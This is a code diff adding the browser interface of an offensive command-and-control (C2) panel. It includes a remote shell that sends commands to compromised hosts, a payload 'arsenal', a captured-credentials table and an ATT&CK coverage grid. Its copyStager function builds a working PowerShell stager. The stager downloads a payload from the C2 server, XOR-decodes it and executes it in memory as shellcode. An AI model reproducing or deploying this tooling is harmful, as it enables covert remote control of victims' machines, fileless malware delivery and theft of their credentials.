+      <span class="ev-ts">${esc((e.at||'').slice(11,19))}</span>
+      <span class="ev-type">${esc(e.type||'')}</span>
+      <span class="ev-msg">${esc(e.message||'')}</span>
+    </div>`
+  ).join('');
+}
+
+function goShell(sid) {
+  document.querySelector('[data-view="shell"]').click();
+  document.getElementById('shell-sess-select').value = sid;
+  shellSelectSession(sid);
+}
+
+// ── C2 Shell ──────────────────────────────────────────────────────────────────
+function updateShellSelector() {
+  const sel = document.getElementById('shell-sess-select');
+  const cur = sel.value;
+  const sids = Object.keys(liveSessions);
+  const opts = ['<option value="">— select session —</option>'];
+  sids.forEach(sid => {
+    const s = liveSessions[sid];
+    const label = sid.slice(0,16) + ' | ' + s.host + (s.stale ? ' [STALE]' : '');
+    opts.push(`<option value="${esc(sid)}" ${sid===cur?'selected':''}>${esc(label)}</option>`);
+  });
+  sel.innerHTML = opts.join('');
+}
+
+function shellSelectSession(sid) {
+  shellSid = sid || null;
+  const s = liveSessions[sid] || null;
+  const hostEl   = document.getElementById('shell-host');
+  const ipEl     = document.getElementById('shell-ip');
+  const statEl   = document.getElementById('shell-status');
+  const killBtn  = document.getElementById('btn-kill');
+
+  if (s) {
+    hostEl.textContent  = s.host;
+    ipEl.textContent    = '  [' + sid.slice(0,16) + ']';
+    hostEl.style.display = '';
+    ipEl.style.display   = '';
+    killBtn.style.display = '';
+    if (s.stale) {
+      statEl.innerHTML = '<span class="badge badge-stale">STALE</span>';
+    } else {
+      statEl.innerHTML = '<span class="dot dot-green"></span><span class="badge badge-alive">ALIVE</span>';
+    }
+  } else {
+    hostEl.style.display = 'none';
+    ipEl.style.display   = 'none';
+    statEl.innerHTML     = '';
+    killBtn.style.display = 'none';
+  }
+  document.getElementById('shell-input').focus();
+}
+
+function shellKeydown(e) {
+  if (e.key === 'Enter') { shellSend(); return; }
+  if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (histIdx < shellHistory.length-1) histIdx++;
+    document.getElementById('shell-input').value = shellHistory[shellHistory.length-1-histIdx] || '';
+    return;
+  }
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (histIdx > 0) histIdx--;
+    else { histIdx = -1; document.getElementById('shell-input').value = ''; return; }
+    document.getElementById('shell-input').value = shellHistory[shellHistory.length-1-histIdx] || '';
+  }
+}
+
+function shellQuick(cmd) {
+  document.getElementById('shell-input').value = cmd;
+  document.getElementById('shell-input').focus();
+}
+
+async function shellSend() {
+  const input = document.getElementById('shell-input');
+  const cmd   = input.value.trim();
+  if (!cmd || !shellSid) {
+    if (!shellSid) shellAppend('info', '— no session selected');
+    return;
+  }
+  input.value = '';
+  histIdx = -1;
+  shellHistory.push(cmd);
+  if (shellHistory.length > 200) shellHistory.shift();
+
+  shellAppend('prompt', 'C2> ');
+  shellAppend('cmd', cmd);
+  const pendEl = shellAppend('pending', '  ▸ dispatching...');
+
+  try {
+    const r = await fetch('/ui/api/c2/' + shellSid + '/task', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd}),
+    });
+    if (!r.ok) {
+      pendEl.className = 'sl sl-err';
+      pendEl.textContent = '  [!] dispatch failed — session gone?';
+      return;
+    }
+    const {task_id} = await r.json();
+    pendEl.textContent = '  ▸ task ' + task_id.slice(0,8) + ' queued';
+
+    let attempts = 0;
+    const iv = setInterval(async () => {
+      attempts++;
+      try {
+        const res = await fetch('/ui/api/c2/' + shellSid + '/result/' + task_id);
+        if (res.status === 200) {
+          clearInterval(iv);
+          pendEl.remove();
+          const txt = await res.text();
+          shellAppend('output', txt || '(empty output)');
+          shellScroll();
+        } else if (res.status === 204) {
+          pendEl.textContent = '  ▸ waiting... (' + attempts + ')';
+        } else {
+          clearInterval(iv);
+          pendEl.className = 'sl sl-err';
+          pendEl.textContent = '  [!] result ' + res.status;
+        }
+      } catch(e) {
+        clearInterval(iv);
+        pendEl.className = 'sl sl-err';
+        pendEl.textContent = '  [!] poll error: ' + e.message;
+      }
+      if (attempts > 120) {
+        clearInterval(iv);
+        pendEl.className = 'sl sl-err';
+        pendEl.textContent = '  [!] timeout (4 min)';
+      }
+    }, 2000);
+  } catch(e) {
+    pendEl.className = 'sl sl-err';
+    pendEl.textContent = '  [!] error: ' + e.message;
+  }
+  shellScroll();
+}
+
+function shellAppend(type, text) {
+  const out = document.getElementById('shell-out');
+  const d   = document.createElement('div');
+  d.className = 'sl sl-' + type;
+  if (type === 'prompt') {
+    d.style.display = 'inline';
+    out.appendChild(d);
+    d.textContent = text;
+    return d;
+  }
+  if (type === 'cmd') {
+    const last = out.lastChild;
+    if (last && last.className === 'sl sl-prompt') {
+      const span = document.createElement('span');
+      span.style.cssText = 'color:#e5e7eb';
+      span.textContent = text;
+      out.appendChild(span);
+      const br = document.createElement('br');
+      out.appendChild(br);
+      return span;
+    }
+  }
+  d.textContent = text;
+  out.appendChild(d);
+  shellScroll();
+  return d;
+}
+
+function shellScroll() {
+  const out = document.getElementById('shell-out');
+  out.scrollTop = out.scrollHeight;
+}
+
+function shellClear() {
+  document.getElementById('shell-out').innerHTML = '';
+}
+
+async function shellKill() {
+  if (!shellSid) return;
+  if (!confirm('Kill session ' + shellSid + '?')) return;
+  try {
+    const r = await fetch('/ui/api/c2/' + shellSid, {method:'DELETE'});
+    const d = await r.json();
+    shellAppend('info', d.ok ? '  [*] session killed' : '  [!] kill failed');
+    await fetchLive();
+    shellSelectSession('');
+    document.getElementById('shell-sess-select').value = '';
+  } catch(e) {
+    shellAppend('err', '  [!] error: ' + e.message);
+  }
+}
+
+// ── Sessions view ─────────────────────────────────────────────────────────────
+function renderSessions() {
+  const tbody = document.getElementById('sess-tbody');
+  const allSids = new Set([
+    ...dbSessions.map(s => s.id),
+    ...Object.keys(liveSessions),
+  ]);
+  if (!allSids.size) {
+    tbody.innerHTML = '<tr><td colspan="7" style="color:var(--muted2);text-align:center;padding:20px">No sessions</td></tr>';
+    return;
+  }
+  const rows = [];
+  allSids.forEach(sid => {
+    const db   = dbSessions.find(s => s.id === sid) || {};
+    const live = liveSessions[sid] || null;
+    const host = live ? live.host : (db.host || '—');
+    const label = db.label || '';
+    let statusHtml, lastSeen, queued;
+    if (live) {
+      const stale = live.stale;
+      statusHtml = stale
+        ? '<span class="badge badge-stale">STALE</span>'
+        : '<span class="dot dot-green"></span><span class="badge badge-alive">ALIVE</span>';
+      lastSeen = live.last_seen;
+      queued   = live.pending;
+    } else {
+      statusHtml = '<span class="badge badge-dead">OFFLINE</span>';
+      lastSeen = db.created_at ? db.created_at.slice(0,19) : '—';
+      queued = 0;
+    }
+    const killBtn = live
+      ? `<button class="btn btn-sm btn-red" onclick="killSess('${esc(sid)}')">KILL</button>`
+      : '';
+    const shellBtn = live
+      ? `<button class="btn btn-sm" onclick="goShell('${esc(sid)}')">SHELL</button>`
+      : '';
+    rows.push(`<tr>
+      <td class="mono" style="color:var(--muted2);font-size:11px">${esc(sid.slice(0,20))}</td>
+      <td>${esc(host)}</td>
+      <td style="color:var(--muted2)">${esc(label)}</td>
+      <td>${statusHtml}</td>
+      <td style="color:var(--muted2);font-size:11px">${esc(lastSeen)}</td>
+      <td style="text-align:center">${queued}</td>
+      <td style="display:flex;gap:5px;flex-wrap:wrap">${shellBtn}${killBtn}</td>
+    </tr>`);
+  });
+  tbody.innerHTML = rows.join('');
+}
+
+async function killSess(sid) {
+  if (!confirm('Kill session ' + sid + '?')) return;
+  try {
+    await fetch('/ui/api/c2/' + sid, {method:'DELETE'});
+    await fetchLive();
+    renderSessions();
+  } catch(e) {}
+}
+
+// ── Arsenal ───────────────────────────────────────────────────────────────────
+async function loadArsenal() {
+  const body = document.getElementById('arsenal-body');
+  const wsEl = document.getElementById('arsenal-ws');
+  try {
+    const r = await fetch('/ui/api/arsenal');
+    const {workspace, files} = await r.json();
+    wsEl.textContent = 'Workspace: ' + (workspace || '—');
+    if (!files || !files.length) {
+      body.innerHTML = '<div style="color:var(--muted2);font-size:12px">No files in workspace</div>';
+      return;
+    }
+    const cats = {
+      'enc':   {label:'ENCODED PAYLOADS (.enc)', items:[]},
+      'dat':   {label:'STAGED DATA (.dat)',       items:[]},
+      'ps1':   {label:'POWERSHELL STAGERS (.ps1)',items:[]},
+      'exe':   {label:'EXECUTABLES (.exe)',       items:[]},
+      'other': {label:'OTHER FILES',              items:[]},
+    };
+    files.forEach(f => {
+      const e = f.ext.replace('.','') || 'other';
+      if (cats[e]) cats[e].items.push(f);
+      else cats.other.items.push(f);
+    });
+    const base = window.location.protocol + '//' + window.location.host;
+    let html = '';
+    Object.values(cats).forEach(cat => {
+      if (!cat.items.length) return;
+      html += `<div class="arsenal-cat">${cat.label}</div>`;
+      cat.items.forEach(f => {
+        const url = base + '/' + f.name;
+        html += `<div class="file-row">
+          <span class="file-ext">${esc(f.ext||'?')}</span>
+          <span class="file-name">${esc(f.name)}</span>
+          <span class="file-size">${fmt_size(f.size)}</span>
+          <button class="copy-btn" onclick="copyURL(this,'${esc(url)}')">copy URL</button>
+          <button class="copy-btn" onclick="copyStager(this,'${esc(f.name)}')">stager PS1</button>
+        </div>`;
+      });
+    });
+    body.innerHTML = html;
+  } catch(e) {
+    body.innerHTML = '<div style="color:var(--red2)">Error: ' + esc(e.message) + '</div>';
+  }
+}
+
+function copyURL(btn, url) {
+  navigator.clipboard.writeText(url).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent='copy URL'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function copyStager(btn, fname) {
+  const base = window.location.protocol + '//' + window.location.host;
+  const stager = `$d=(New-Object Net.WebClient).DownloadData('${base}/${fname}');` +
+    `$k=0x5A;$d=[byte[]]($d|%{$_-bxor$k});` +
+    `$h=[System.Runtime.InteropServices.GCHandle]::Alloc($d,3);` +
+    `([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(` +
+    `$h.AddrOfPinnedObject(),[Action]))()`;
+  navigator.clipboard.writeText(stager).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent='stager PS1'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ── ATT&CK ────────────────────────────────────────────────────────────────────
+async function loadAttack() {
+  try {
+    const r = await fetch('/ui/api/techniques');
+    const {all_techniques, tactic_order, covered} = await r.json();
+    document.getElementById('atk-cov').textContent = Object.keys(covered).length;
+    document.getElementById('atk-tot').textContent = Object.keys(all_techniques).length;
+    const grid = document.getElementById('atk-grid');
+    const byTactic = {};
+    tactic_order.forEach(t => { byTactic[t] = []; });
+    Object.entries(all_techniques).forEach(([tid, meta]) => {
+      const tac = meta.tactic || 'Other';
+      if (!byTactic[tac]) byTactic[tac] = [];
+      byTactic[tac].push({tid, ...meta});
+    });
+    grid.innerHTML = tactic_order.map(tac => {
+      const techs = (byTactic[tac]||[]);
+      return `<div class="atk-col">
+        <div class="atk-tactic">${esc(tac.toUpperCase())}</div>
+        ${techs.map(t => {
+          const isCov = covered[t.tid];
+          const cnt   = isCov ? ' ×' + (isCov.length) : '';
+          return `<div class="atk-tech ${isCov?'covered':''}">
+            ${esc(t.name)}${cnt}
+            <span class="atk-tid">${esc(t.tid)}</span>
+          </div>`;
+        }).join('')}
+      </div>`;
+    }).join('');
+  } catch(e) {}
+}
+
+// ── Credentials ───────────────────────────────────────────────────────────────
+async function loadCreds() {
+  try {
+    const r = await fetch('/ui/api/credentials');
+    const creds = await r.json();
+    const tbody = document.getElementById('creds-tbody');
+    if (!creds.length) {
+      tbody.innerHTML = '<tr><td colspan="4" style="color:var(--muted2);text-align:center;padding:20px">No credential findings</td></tr>';
+      return;
+    }
+    tbody.innerHTML = creds.map(c => {
+      const hints = (c.cred_hints||[]).map(h =>
+        `<div class="hint">${esc(h.type||'')}  <strong>${esc(h.value||'')}</strong></div>`
+      ).join('');
+      return `<tr class="cred-row">
+        <td>${esc((c.session_id||'').slice(0,12))}</td>
+        <td>${esc(c.tool||'')}</td>
+        <td style="color:var(--muted2);font-size:11px">${esc((c.captured_at||'').slice(0,19))}</td>
+        <td>${hints || '<span style="color:var(--muted2)">—</span>'}</td>
+      </tr>`;
+    }).join('');
+  } catch(e) {}
+}
+
+// ── Report ────────────────────────────────────────────────────────────────────
+async function loadReport() {
+  try {
+    const r = await fetch('/ui/api/sessions');
+    const sessions = await r.json();
+    const ed = document.getElementById('label-editor');
+    ed.innerHTML = sessions.map(s => `
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
+        <span style="color:var(--muted2);font-size:11px;width:120px">${esc((s.id||'').slice(0,14))}</span>
+        <input style="flex:1;background:var(--surf3);border:1px solid var(--bord2);color:var(--text);
+               font:12px var(--mono);padding:4px 8px;border-radius:3px;min-width:120px"
+          placeholder="label" value="${esc(s.label||'')}" id="lbl-${esc(s.id)}">
+        <input style="flex:2;background:var(--surf3);border:1px solid var(--bord2);color:var(--text);
+               font:12px var(--mono);padding:4px 8px;border-radius:3px;min-width:200px"
+          placeholder="note" value="${esc(s.note||'')}" id="note-${esc(s.id)}">
+        <button class="btn btn-sm" onclick="saveLabel('${esc(s.id)}')">Save</button>
+      </div>`).join('');
+  } catch(e) {}
+}
+
+async function saveLabel(sid) {
+  const label = document.getElementById('lbl-' + sid).value;
+  const note  = document.getElementById('note-' + sid).value;
+  await fetch('/ui/api/sessions/' + sid + '/label', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({label, note}),
+  });
+}
+
+// ── Boot ──────────────────────────────────────────────────────────────────────
+refreshAll();
+setInterval(refreshAll, 5000);
 </script>
-</body></html>"""
+</body>
+</html>"""
